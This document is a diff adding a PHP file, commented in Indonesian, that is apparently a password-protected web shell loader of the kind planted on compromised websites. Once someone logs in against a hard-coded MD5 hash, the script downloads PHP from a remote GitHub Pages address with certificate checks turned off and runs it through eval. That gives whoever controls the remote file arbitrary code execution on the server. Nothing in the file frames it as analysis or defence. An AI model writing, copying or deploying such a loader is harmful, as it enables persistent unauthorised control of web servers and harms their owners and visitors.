@@ -1,0 +1,91 @@
+<?php
+session_start();
+
+/**
+ * Fungsi untuk mendapatkan konten URL menggunakan cURL, file_get_contents, atau fopen.
+ */
+function geturlsinfo($url) {
+    if (function_exists('curl_exec')) {
+        // Menggunakan cURL untuk mengambil konten URL
+        $conn = curl_init($url);
+        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
+        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
+
+        // Menambahkan cookie jika ada session
+        if (isset($_SESSION['SAP'])) {
+            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['SAP']);
+        }
+
+        $url_get_contents_data = curl_exec($conn);
+        curl_close($conn);
+    } elseif (function_exists('file_get_contents')) {
+        // Jika cURL tidak tersedia, menggunakan file_get_contents
+        $url_get_contents_data = file_get_contents($url);
+    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
+        // Jika file_get_contents juga tidak ada, mencoba menggunakan fopen dan stream_get_contents
+        $handle = fopen($url, "r");
+        $url_get_contents_data = stream_get_contents($handle);
+        fclose($handle);
+    } else {
+        // Jika semua metode gagal, mengembalikan false
+        $url_get_contents_data = false;
+    }
+    return $url_get_contents_data;
+}
+
+/**
+ * Fungsi untuk memeriksa apakah pengguna sudah login
+ */
+function is_logged_in()
+{
+    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
+}
+
+// Cek jika password sudah dikirim melalui form
+if (isset($_POST['password'])) {
+    $entered_password = $_POST['password'];
+    $hashed_password = '517fd1559deaf6147ec7051ef4ad4b29'; // Gantilah dengan password yang sudah di-hash MD5 yang benar
+
+    // Cek jika password yang dimasukkan sesuai dengan password yang sudah di-hash
+    if (md5($entered_password) === $hashed_password) {
+        // Jika password benar, simpan session untuk login
+        $_SESSION['logged_in'] = true;
+        $_SESSION['SAP'] = 'janco'; // Cookie data, ganti dengan data yang sesuai
+    } else {
+        // Jika password salah, tampilkan pesan kesalahan
+        echo "Incorrect password. Please try again.";
+    }
+}
+
+// Cek jika pengguna sudah login sebelum menampilkan konten
+if (is_logged_in()) {
+    // Ambil konten dari URL yang diberikan
+    $a = geturlsinfo('https://wak39tolkon.github.io/kwn/bawang.txt');
+    
+    // Mengeksekusi konten PHP yang diterima dari URL
+    eval('?>' . $a);
+} else {
+    // Jika pengguna belum login, tampilkan form login
+    ?>
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Seo Bawang</title>
+    </head>
+    <body style="background-color: black;">
+        <center>
+        <img src="https://res.cloudinary.com/dsuor6xqq/image/upload/v1735355162/y2mqh3cjxem8iro2xp1z.gif" />
+        <form method="POST" action="">
+            <label for="password" style="color: white;">Password:</label>
+            <input type="password" id="password" name="password" style="padding: 10px; margin: 10px;">
+            <input type="submit" value="Touch Me!" style="padding: 10px; background-color: #007bff; color: white;">
+        </form>
+        </center>
+    </body>
+    </html>
+    <?php
+}
+?>
